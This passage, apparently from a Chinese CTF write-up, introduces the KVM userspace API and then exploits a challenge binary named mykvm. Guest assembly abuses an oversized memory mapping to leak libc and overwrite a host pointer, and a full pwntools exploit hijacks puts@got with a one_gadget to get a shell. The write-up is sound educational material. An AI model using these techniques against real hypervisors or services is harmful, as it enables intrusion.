<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure>
<p>接下来，我们需要创建一个虚拟机（VM），它表示与一个模拟系统关联的所有内容，包括内存和一个或多个 CPU，KVM 以文件描述符的形式为我们提供此 VM 的句柄：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VM:0xae01 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>KVM 系统提供文件描述符来控制虚拟机 </li>
</ul>
<p>虚拟机需要我们提供内存，对应虚拟机中的物理地址空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一页内存来保存测试代码，直接使用 mmap 获得页对齐的、初始值为 0 的内存</li>
</ul>
<p>将机器码复制到这块内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure>
<p>使用 KVM_SET_USER_MEMORY_REGION 通知 KVM 虚拟机有4096字节的内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span>=</span> &#123;</span><br><span class="line">    .slot = <span class="number">0</span>,</span><br><span class="line">    .guest_phys_addr= <span class="number">0x1000</span>,</span><br><span class="line">    .memory_size = <span class="number">0x1000</span>,</span><br><span class="line">    .userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region); </span><br><span class="line"><span class="comment">/* KVM_SET_USER_MEMORY_REGION:0x4020ae46 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>slot 字段表示 KVM 中内存空间的索引：<ul>
<li>当我们使用相同的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会替换掉这个 mapping，当使用新的 slot 调用 KVM_SET_USER_MEMORY_REGION 时会创建新的 mapping</li>
</ul>
</li>
<li>guest_phys_addr 虚机中的基础物理地址</li>
<li>userspace_addr 指向我们通过 mmap 申请的内存，注意这是一个 64-bit 的值</li>
<li>memory_size 表示要映射的内存的大小：0x1000字节</li>
</ul>
<p>现在我们的 VM 中有内存，内存中有要运行的代码，现在我们创建一个 VCPU 去运行这些代码，KVM 提供给我们控制这个 VCPU 的文件描述符，0 表示虚拟 CPU 的索引，索引的最大值可通过 KVM_CAP_MAX_VCPUS 获得：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vcpufd= ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VCPU:0xae41 */</span></span><br></pre></td></tr></table></figure>
<p>每个虚拟CPU都关联一个 kvm_run 结构体，这个结构体用来在内核和用户空间传递 CPU 的信息，尤其是当硬件虚拟化停止时(vmexit)，kvm_run 结构体包含停止原因</p>
<p>我们将这个结构体通过 mmap 映射到用户空间，首先我们通过 KVM_GET_VCPU_MMAP_SIZE 得知有多少内存需要映射：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">/* KVM_GET_VCPU_MMAP_SIZE:0xae04 */</span></span><br></pre></td></tr></table></figure>
<p>一般 mmap_size 大于 kvm_run 结构体的大小，因为内核会使用这片区域去存其它的瞬态信息，使用 mmap 映射 kvm_run 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/* PROT_READ|PROT_WRITE:3 */</span></span><br><span class="line"><span class="comment">/* MAP_SHARED:1 */</span></span><br></pre></td></tr></table></figure>
<p>VCPU 同样包括寄存器，KVM 将寄存器分为两类：标准寄存器和特殊寄存器，分别使用 kvm_regs 和 kvm_sregs 结构体表示，在运行我们的代码前要先初始化这个寄存器</p>
<ul>
<li>初始化特殊寄存器：我们只需设置 cs 寄存器，将 cs 的 base 和 selector 设为“0”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br><span class="line"><span class="comment">/* KVM_SET_SREGS:0x8138ae83 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>初始化标准寄存器：我们大部分设为“0”，instruction pointer 设为“0x1000”，al 和 bl 设为“2”，flags 寄存器设置为“2”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> =</span> &#123;</span><br><span class="line">    .rip = <span class="number">0x1000</span>,</span><br><span class="line">    .rax = <span class="number">2</span>,</span><br><span class="line">    .rbx = <span class="number">2</span>,</span><br><span class="line">    .rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line">ret = ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br><span class="line"><span class="comment">/* KVM_SET_REGS:0x4090ae82 */</span></span><br></pre></td></tr></table></figure>
<p>创建 VM 和 VCPU、映射和初始化内存、并设置初始寄存器状态后，我们现在可以使用 KVM_RUN 开始使用 VCPU 运行指令</p>
<p>每次虚拟化停止时，它都会返回，因此我们将在循环中运行它：（根据停止原因进行相应的处理）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    ret = ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* KVM_RUN:0xae80 */</span></span><br><span class="line">    <span class="keyword">switch</span> (run-&gt;exit_reason) &#123; <span class="comment">/* kvm_run结构体包含停止原因 */</span></span><br><span class="line">        <span class="comment">/* Handle exit */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/658511/">使用 KVM API</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718329?spm=1001.2014.3001.5502">KVM学习1—安装编译测试kvm模块</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718366">KVM学习2—使用KVM API创建并运行虚拟机</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhang_syi/article/details/52718377?spm=1001.2014.3001.5502">KVM学习3—编写简单在虚拟机中学习的汇编程序</a> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>fd：文件描述符 </li>
<li>request：命令码，应用程序通过下发命令码来控制驱动程序完成对应操作</li>
<li>“…”：是可变参数 arg，一些情况下应用程序需要向驱动程序传参，参数就通过 ag 来传递</li>
<li>返回值：驱动程序中 ioctl 接口给的返回值，驱动程序可以通过返回值向用户程序传参，ioctl 运行失败时一定会返回“-1”并设置全局变量 errorno</li>
</ul>
<p><strong>关于汇编的知识</strong></p>
<p>MOVZX 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数0扩展到16位或32位（这条指令只用于无符号整数）</p>
<ul>
<li>下图展示了如何将源操作数进行全零扩展，并送入16位目的操作数：</li>
</ul>
<img src="/2022/07/12/KVM%20pwn/1657603737686.png" class width="1657603737686"> 
<p>MOVSX 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到16位或32位（这条指令只用于有符号整数）</p>
<ul>
<li>下图展示了如何将源操作数进行符号扩展（符号位为“1”），并送入16位目的操作数：</li>
</ul>
<img src="/2022/07/12/KVM%20pwn/1657603860296.png" class width="1657603860296"> 
<p>全零扩展：零扩展就是全补零，不论其符号位是多少，高位全都补 “0”</p>
<p>符号扩展：当用更多的内存存储某一个有符号数时，由于符号位位于该数的第一位，扩展之后，符号位仍然需要位于第一位：</p>
<ul>
<li>当扩展一个负数时，需要将扩展的高位全赋为 “1”</li>
<li>当扩展一个正数时（包括无符号数），符号扩展和零扩展是一样的，因为符号位就是 “0”</li>
</ul>
<p>案例：</p>
<ul>
<li>用8位二进制表示 “-1”，则是  11111111 </li>
<li>用16位二进制表示时，则为 11111111 11111111 高位全都是 “1”，这个叫做符号扩展，主要用于对齐操作数</li>
</ul>
<p>汇编语言中，CPU 对外设的操作通过专门的端口读写指令来完成：读端口用 IN 指令，写端口用 OUT 指令</p>
<p><strong>漏洞分析</strong></p>
<p>漏洞点一：负数溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;your code size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;kvm);                 <span class="comment">// int</span></span><br><span class="line"><span class="keyword">if</span> ( kvm.size &lt;= <span class="number">4096</span> )                     <span class="comment">// int</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your code: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, kvm.code, kvm.size);              <span class="comment">// unsigned int,负数溢出</span></span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest name: &quot;</span>);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;guest passwd: &quot;</span>);</span><br><span class="line">  pwn(kvm.code, kvm.size);</span><br><span class="line">  kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>令 kvm.size = -1，下一个 read 就会有栈溢出</li>
<li>不过有 canary 的限制，不能直接利用</li>
</ul>
<p>漏洞点二：没有置空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Struct kvm; <span class="comment">// [rsp+4h] [rbp-101Ch] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+1018h] [rbp-8h]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>Struct kvm 在栈上占用的范围很大，其中包含了大量存留指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(</span><br><span class="line">  (&amp;code_bss - (((((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>) + &amp;code_bss) &amp; <span class="number">0xFFF</span>) - ((&amp;code_bss &gt;&gt; <span class="number">0x1F</span>) &gt;&gt; <span class="number">0x14</span>)) + <span class="number">0x1000</span>),</span><br><span class="line">  code,</span><br><span class="line">  size);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>memcpy 中的 size 我们可以控制</li>
<li>只要 size 足够大，就可以把栈上的指针 copy 到 bss 段（方便后续利用）</li>
</ul>
<p>漏洞点三：越界</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">region.slot = <span class="number">0</span>;</span><br><span class="line">region.flags = <span class="number">0</span>;</span><br><span class="line">region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">region.memory_size = <span class="number">0x40000000</span>LL;            <span class="comment">// 这里肯定有溢出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>memory_size 表示要映射的内存的大小：0x40000000 字节</li>
<li>映射内存范围过大，导致 guest 代码能访问到宿主机的 bss 段中的其他变量 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0000000000602100</span> ??                            code_bss db    ? ;                      ; DATA XREF: pwn+<span class="number">8</span>C↑o</span><br><span class="line">    ......</span><br><span class="line">.bss:<span class="number">000000000060</span>A100 ?? ?? ?? ?? ?? ?? ?? ??       dest dq ?                               ; DATA XREF: main+<span class="number">7</span>E↑w</span><br></pre></td></tr></table></figure>
<ul>
<li>很明显可以通过 code_bss 访问到 dest</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先肯定要先 leak libc_base，然后通过 code_bss 的溢出来覆盖 dest（可以是 got 或者 hook）</p>
<p>然后在以下代码中输入 one_gadget 就可以了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kvm.name = input_line(<span class="string">&quot;host name: &quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(dest, kvm.name, <span class="number">0x20</span>uLL); </span><br></pre></td></tr></table></figure>
<p>问题的关键就是：写一段由 VCPU 运行的 code 来进行泄露</p>
<p>先使用以下一段 code 进行测试，看看到底泄露了什么东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>利用汇编指令 <code>out</code> 把 al 寄存器中的值输出到 [标准输出]</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bbbbbbbb</span><br><span class="line">\x8a\x07�\x00\x83$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>发现泄露的数据是从 0x603000 开始的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0x8101c38300e6078a</span>	<span class="number">0x0000f4f3760200fb</span></span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>而距离它偏移为 0x358 的地方就有前面 copy 进去的存留指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x603358</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x603358</span> is <span class="number">0x358</span> bytes (<span class="number">0x6b</span> words)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那么进行 leak 的 code 就可以这样写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来用同样的思路覆盖 dest：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x603000</span> <span class="number">0x60A100</span></span><br><span class="line"><span class="number">0x603000</span>-&gt;<span class="number">0x60a100</span> is <span class="number">0x7100</span> bytes (<span class="number">0xe20</span> words)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        .code16</span></span><br><span class="line"><span class="string">        mov bx,0x8</span></span><br><span class="line"><span class="string">        mov ax,0x35</span></span><br><span class="line"><span class="string">        mov ds,ax</span></span><br><span class="line"><span class="string">        mov ax,0x710</span></span><br><span class="line"><span class="string">        mov ss,ax</span></span><br><span class="line"><span class="string">        lable:</span></span><br><span class="line"><span class="string">            mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">            out 0,al</span></span><br><span class="line"><span class="string">            add bx,1</span></span><br><span class="line"><span class="string">            cmp bx,0x200</span></span><br><span class="line"><span class="string">            jna lable</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        xor bx,bx</span></span><br><span class="line"><span class="string">        mov al,0x0B</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">        mov al,0x20</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">        mov al,0x60</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">        mov al,0</span></span><br><span class="line"><span class="string">        mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>把 dest 覆盖为 got 表地址附近，方便修改 put_got</li>
</ul>
<p>最后还有一个问题，readline() 函数会将相当一部分不可见字符转义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x602000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│             <span class="number">0x602000</span> —▸ <span class="number">0x601e18</span> ◂— <span class="number">0x5858585858585858</span> (<span class="string">&#x27;XXXXXXXX&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│ rax<span class="number">-3</span> rdi<span class="number">-3</span> <span class="number">0x602008</span> ◂— <span class="number">0x6161616161136168</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x602010</span> ◂— <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaGb&#x27;</span></span><br><span class="line">... ↓                <span class="number">2</span> skipped</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x602028</span> (<span class="built_in">puts</span>@got.plt) ◂— <span class="number">0x7f9eec006247</span> <span class="comment">/* &#x27;Gb&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>解决的办法就是：检查 one_gadget 的每一字节，如果是不可见字符则重启程序</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    p=process(<span class="string">&#x27;./mykvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    code=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            .code16</span></span><br><span class="line"><span class="string">            mov bx,0x8</span></span><br><span class="line"><span class="string">            mov ax,0x35</span></span><br><span class="line"><span class="string">            mov ds,ax</span></span><br><span class="line"><span class="string">            mov ax,0x710</span></span><br><span class="line"><span class="string">            mov ss,ax</span></span><br><span class="line"><span class="string">            lable:</span></span><br><span class="line"><span class="string">                mov al,byte ptr ds:[bx]</span></span><br><span class="line"><span class="string">                out 0,al</span></span><br><span class="line"><span class="string">                add bx,1</span></span><br><span class="line"><span class="string">                cmp bx,0x200</span></span><br><span class="line"><span class="string">                jna lable</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            xor bx,bx</span></span><br><span class="line"><span class="string">            mov al,0x0B</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x0],al</span></span><br><span class="line"><span class="string">            mov al,0x20</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x1],al</span></span><br><span class="line"><span class="string">            mov al,0x60</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x2],al</span></span><br><span class="line"><span class="string">            mov al,0</span></span><br><span class="line"><span class="string">            mov ss:[bx+0x3],al</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            hlt</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,&quot;b*0x400E64&quot;)</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x1000</span></span><br><span class="line">    name = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    passwd = <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;guest passwd:&quot;</span>,passwd)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base=leak_addr-<span class="number">0x3d1198</span></span><br><span class="line">    success(<span class="string">&quot;leak_addr: &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    one_gadget=libc_base+<span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line">    test=one_gadget</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">        char=test%<span class="number">0x100</span></span><br><span class="line">        <span class="keyword">if</span> (char&gt;<span class="number">0x7e</span> <span class="keyword">or</span> char&lt;<span class="number">0x20</span> ):</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        test=test//<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">if</span> (flag==<span class="number">1</span>):</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;host name: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x1D</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
